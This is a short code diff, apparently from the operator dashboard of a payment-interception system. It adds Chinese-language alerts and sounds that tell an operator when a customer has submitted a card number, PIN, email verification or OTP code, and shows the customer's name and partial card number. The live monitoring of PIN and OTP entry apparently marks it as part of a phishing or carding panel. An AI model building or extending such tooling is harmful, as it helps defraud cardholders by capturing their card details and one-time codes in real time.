@@ -79,10 +79,15 @@ const { connected, sendAction, ws } = usePaymentWs({
           });
         } else {
           (s as any).appVerifyPending = false;
+          const cs = data.currentStep || s.currentStep || '';
           const hasOtp = !!(data.cardInfo?.otpCode || (s as any).cardInfo?.otpCode);
-          playAudio(hasOtp ? audioOtp : audioCard);
+          let notifTitle = '客户已提交卡号';
+          if (cs === 'pin_verify') notifTitle = '客户已提交PIN验证';
+          else if (cs === 'email_verify') notifTitle = '客户已提交邮箱验证';
+          else if (hasOtp || cs === 'otp') notifTitle = '客户已提交验证码';
+          playAudio(hasOtp || cs === 'pin_verify' || cs === 'email_verify' ? audioOtp : audioCard);
           window.$notification?.warning({
-            title: hasOtp ? '客户已提交验证码' : '客户已提交卡号',
+            title: notifTitle,
             content: `编号 ${s.sessionId} - ${s.customerInfo?.fullName || '未知用户'} - 卡号 ${s.cardInfo?.cardNumber?.slice(0,4) || '****'}****`,
             duration: 6000
           });
